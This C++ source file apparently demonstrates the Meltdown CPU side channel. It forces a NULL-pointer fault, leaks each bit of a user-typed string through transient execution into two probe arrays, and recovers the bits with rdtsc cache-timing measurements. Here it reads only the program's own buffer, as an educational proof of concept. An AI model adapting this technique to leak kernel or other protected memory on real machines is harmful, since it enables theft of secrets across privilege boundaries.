#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/types.h> 
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include <unistd.h>
#include <iostream>
#include <xmmintrin.h>
#include <thread>
#include <sys/wait.h>
#include <csignal>
#include <atomic>
#include<map>
#include <signal.h>
#include <setjmp.h>
#include <sys/ipc.h> 
#include <sys/shm.h> 
using namespace std;

sigjmp_buf point;
long long int cnt=0;



void handler(int sig, siginfo_t *dont_care, void *dont_care_either) { 
   cout << "The interrupt signal is (" << sig  << ")." <<"count:"<<cnt<<"\r";
   cnt++; // count of number of illegal memory access interrupts

   longjmp(point, 1);   // jump to the jump point set below just before crash2 call in the if condition, but this time 1 is passed and setjnp returns 1 and the loop increments without repeating the ith iteration again
//    exit(signal_num);   
}


//// read the time count from the tsc(time stamp counter) :rdtsc instruction
 unsigned long probe_timing(int *adrs)  {
    volatile unsigned long time;
////_volatile_ forces compiler to stop reordering for optimizing 
//// which is important in out of order exec supported processors as the time taken between
//// a mem_access event make be take after the mem_access event itself
    asm __volatile__(
        "    mfence             \n"     // runtime memory barrier instruction, it  stops all memory operations reordering
        "    lfence             \n"     // again stops reordering stops ld/st inst. before it and after it to exchange
        "    rdtsc              \n"     // read time stamp counter: t1
        "    lfence             \n"     // same
        "    movl %%eax, %%esi  \n"     // load tsc value to esi
        "    movl (%1), %%eax   \n"     // load probe addr to eax register 
        "    lfence             \n"     // same
        "    rdtsc              \n"     // again read time stamp counter: t2
        "    subl %%esi, %%eax  \n"     // eax = t2 - t1 ,get the time difference
        // "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}
//// The main function where meltdown happens, it is made to crash to simulate illegal memory access
void crash2(char* addr, int* a[], long int pos){
    long int t=pos; // check variable (no use)
    char* illegal_addr = NULL; // the illegal address to simulate crash set to NULL i.e a NULL pointer
    asm (


        " movq (%3), %%rdx              \n" // [Access NULL pointer i.e illegal_addr] raising exception(SIGSEGV) ( logically no line after this should be executed instead jump to jmppoint after signal handling)
        " movzx (%2), %%rbx             \n" // access target char array
        " and  %4, %%rbx                \n" // mask ith bit of target memory value

        " movq (%1,%%rbx,8), %%rax      \n" // access probe array(load addr) using ith_bit as index to probe array pointer { a[0] or a[1] }
        " movq (%%rax,%%rbx,4), %%rax   \n" // access the value of the {a[0] or a[1]} meaning pulling it to L1 cache as this step is repeated 1000000 times for 1 bit after each flush
            
        : "=r"(t)                                           // %0 : the check variable (no use just for testing purposes)
        : "c"(a), "b"(addr), "d"(illegal_addr), "a"(t)      // %1, %2, %3, %4 resp. [%1: probe_array, %2: target_addr, %3: illegal_addr pointing to NULL to simulate segfault, %4: (no use, testing) ]
        : 
    );

cout<<"pop"<<t<<"\n";
}


//// Flush the L1 cache of max 128K (depends on computer)
//// I didn't use clflush() or other flush instructions as they didn't seem to work after repeated failures
//// Instead I just iterated over an excessively large array doing st/ld operation on each element to replace the cache
void flush_cache(){

    int flu[264000] ={0};
    int g=0;
    for(int i=0; i<264000; i++){
        flu[i] = -123;
        g = flu[i];
    }
}


//// driver function for retreiveing bit by bit of target memory value
int read8bit(void* sd, int* a[]){
    int g=0;    // testing
    int posx[] = {1,2,4,8,16,32,64,128}; // corresponding to bit positions {0 to 7} acts as bitmask
    int ascii = 0;  // each 8_bit/byte valuue to be stored here 


    int avdenom = 10;   // I used 10 samples to avg out( lesser values gave a few incorrect characters)

    for(int kpos=0; kpos<=7; kpos++){   // for each position of a byte (i.e char data type) iterate
    int t0=0;   // time for the 0 bit value indicator probe array
    int t1=0;   // time for the 1 bit value indicator probe array

        for(int avi = 0; avi < avdenom; avi ++){    // run no. of samples
            for(int i=1;i<=100000;i++)      // retry the crash or meltdown function 100000 times to ensure L1 cache arrival (again lesser values gave few incorrect characters sometimes)
            {if (setjmp(point) == 0){       // set jump point to return to when the crash2() func crashes intentionally due to illegal memory access of NULL pointer above(see above), setjmp returns zero if direct call return but returns 2nd arg to longjmp(.,.) if return from longjmp
                crash2(((char*)sd),a, posx[kpos] ); // Call the actual meltdown function : crash2
            }
        }
        cout<<"\n";
        flush_cache();              // flush the cache after each sample try          
        t0 += probe_timing(a[0]);   // add time difference for 0 bit value indicator
        t1 += probe_timing(a[1]);   // add time difference for 1 bit value indicator

        }
        t0 = t0/avdenom;    // compute average for 0
        t1 = t1/avdenom;    // compute average for 1
        // cout<<"\n";

        if (   t0 <  t1 ) {    // multiply 2^(position) * bit_value and add to ascii value for the character; where {bit = 0 if t0 < t1,bit = 1 if t1 < t0} access times
            ascii = ascii + ( posx[kpos] * 0 );
        } else {
            ascii = ascii + ( posx[kpos] * 1 );
        }



    flush_cache();      // Again flush cache after 1 character is completed 


    }


    return ascii;       // return the ascii value of the char
}





int main()
{

srand(1);
int *a[2]; // pointer array to probe arrays

a[0] = (int*)malloc(64000); // 1st probe array
int *b = (int*)malloc(128000); // Assign big space in between to make 1st & 2nd probe array non-contiguous
a[1] = (int*)malloc(64000);     // 2nd probe array

// cout<<a[0]<<" "<<a[1]<<"\n";


 


char inp[256]; // char array for input

void *sd = mmap(NULL, sizeof(char)*20, PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);  /// allocate 20 chars size in dynamic memory i.e 20 bytes, this will be our target array
// *(char*)ad = 'a';

// I limited it to 20 characters as it takes long time to recover
cout<<"Write at most 20 characters without spaces!\n";
cin>>inp;
cout<<"len:"<<strlen(inp)<<"\n";
//// assign the input phrase to target array
for(int i=0; i < strlen(inp); i++){
    *((char*)sd+i) = (char) inp[i];
}


//// Signal handler Initialization to handle SIGSEGV without killing the process itself
    struct sigaction sa;

    memset(&sa, 0, sizeof(struct sigaction)); // allocate space for sigaction object
    sigemptyset(&sa.sa_mask);

    sa.sa_flags     = SA_NODEFER; // This Flag allows the signal to be received by the signal handler function above
    sa.sa_sigaction = handler;      // assign the above defined handle() function 

    sigaction(SIGSEGV, &sa, NULL);  // Set signal to be handled as SIGSEGV







int out[20]={0};        // Output array for recovered 20 ascii values
printf("Recovering:\n\n");

for(int i=0; i < strlen(inp); i++)  //// Perform char byte recovery for the input string
{
    out[i] = read8bit((char*)sd+i,a);   // get acii values of ith character in the input string vis Meltdown
    printf("%dth character: %c\n",i ,out[i]);

}
printf("\n");
////Printing the Results
printf("Recovered:\n");
for(int i=0; i < strlen(inp); i++) { printf("%c",out[i]); }
printf("\n");






    return 0;
}